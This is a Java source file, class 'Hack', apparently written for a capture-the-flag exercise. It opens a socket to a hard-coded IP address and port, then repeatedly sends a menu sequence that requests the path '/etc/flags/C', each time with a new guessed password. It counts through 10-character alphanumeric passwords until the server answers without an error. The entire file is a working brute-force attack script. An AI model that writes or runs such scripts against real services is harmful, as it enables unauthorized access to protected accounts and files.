package test;

import java.io.*;
import java.net.*;
import java.util.Scanner;

class Hack {

    public int port = 33322;
    public String hostname;

    private Object lock = new Object();

    public boolean success = false;

    public class InputHandler extends Thread {
        private BufferedReader in;
        public InputHandler(BufferedReader in) {
            this.in = in;
        }

        public void run() {
            try {
                String line = "";
                while ((line = in.readLine()) != null)
                    //System.out.println(line);
                if (line!=null && !line.contains("Error"))
                {
                    synchronized (lock)
                    {
                        System.out.println(line);
                        success = true;
                    }
                }
            } catch (IOException e) {
                System.err.println("Connection to server lost");
            }
        }
    }

    public String newHackPassword(String pass)
    {
        boolean carry = false;
        char [] passArr = pass.toCharArray();
        for (int i = 9; i >= 0; --i)
        {
            if (carry)
            {
                if (passArr[i] == 'Z')
                {
                    if (i == 0)
                    {
                        System.out.println("Hack failed");
                        synchronized (lock)
                        {
                            break;
                        }
                    }
                    passArr[i]='0';

                }
                else if (passArr[i] == '9')
                {
                    passArr[i] = 'A';
                    break;
                }
                else
                {
                    passArr[i]++;
                    break;
                }
            }
            else
            {
                if (passArr[i] == 'Z')
                {
                    passArr[i] = '0';
                    carry = true;
                }
                else if (passArr[i] == '9')
                {
                    passArr[i] = 'A';
                    break;
                }
                else
                {
                    passArr[i]++;
                    break;
                }
            }
        }
        return String.copyValueOf(passArr);
    }


    public void start() throws IOException {
        hostname = "54.149.180.162";

        Socket sock;
        try {
            sock = new Socket(hostname, port);

            BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                    PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
            Scanner stdin = new Scanner(System.in);

            InputHandler inputThread = new InputHandler(in);
            inputThread.start();

            String pass = "00000PL1FP";
            boolean active = true;
            while (active) {
                out.println("update");
                out.println("menu");
                out.println("/etc/flags/C");
                out.println(pass);

                pass = newHackPassword(pass);
                //System.out.println("Trying new password: " + pass);

                synchronized (lock)
                {
                    if (success)
                    {
                        break;
                    }
                }
            }

            inputThread.join();

            in.close();
            out.close();
            sock.close();

        } catch (UnknownHostException e) {
            System.err.println("Cannot identify server");
        } catch (IOException e) {
            System.err.println("Communication fail");
        } catch (InterruptedException e) {
            System.err.println("Thread fail");
        }
    }
}